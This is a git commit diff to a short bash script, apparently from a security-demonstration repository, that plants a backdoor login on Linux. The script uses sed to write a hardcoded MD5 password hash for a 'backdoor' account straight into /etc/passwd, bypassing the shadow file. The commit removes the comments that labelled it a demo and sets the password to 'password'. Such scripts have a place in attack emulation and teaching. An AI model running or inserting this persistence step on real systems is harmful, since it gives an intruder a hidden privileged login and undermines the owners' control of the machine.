39f99b4588288b289b77b6540df683378fe3999f
jbean <jab1896@msstate.edu>
2026-06-09 15:48:41 -0500

    fix hash, add command

--- TTP2/backdoor_uid_hash.sh
+++ TTP2/backdoor_uid_hash.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
-# DEMO 3: Inject a password hash directly into /etc/passwd (bypass shadow)
-# Requires: root
-# Shows: attacker removing shadow reference so a known password works
-# Note: uses a hardcoded hash for the password "demo123" - not a real credential
 
-KNOWN_HASH='$1$demo$rLPaQn1TCuFAjQnVOlVAe/'
+# md5 hash for 'password'
+#
+# $ openssl passwd password
+
+KNOWN_HASH='$1$rTpwIewp$ku6Ad5IB7cAuLnfL30h8k0'
 
 # Replace the 'x' shadow reference with a real hash
 sed -i "s/^backdoor:x:/backdoor:$KNOWN_HASH:/" /etc/passwd
